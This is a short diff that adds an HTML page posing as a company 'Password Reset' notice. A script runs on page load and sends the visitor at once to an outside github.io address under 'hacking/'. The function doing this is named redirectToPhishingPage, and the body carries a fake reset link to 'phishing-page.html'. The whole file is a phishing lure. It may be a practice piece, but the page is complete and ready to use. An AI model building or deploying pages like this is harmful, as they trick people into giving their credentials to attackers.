@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Password Reset</title>
+    <script>
+        function redirectToPhishingPage() {
+       
+            window.location.href = 'https://bobsy-doodles.github.io/hacking/';
+        }
+
+       
+        window.onload = redirectToPhishingPage;
+    </script>
+</head>
+<body>
+    <p>Dear User,</p>
+    <p>Please click the link below to reset your password:</p>
+    <a href="phishing-page.html">Reset Password</a>
+    <p>Best regards,<br>Your Company</p>
+</body>
+</html>
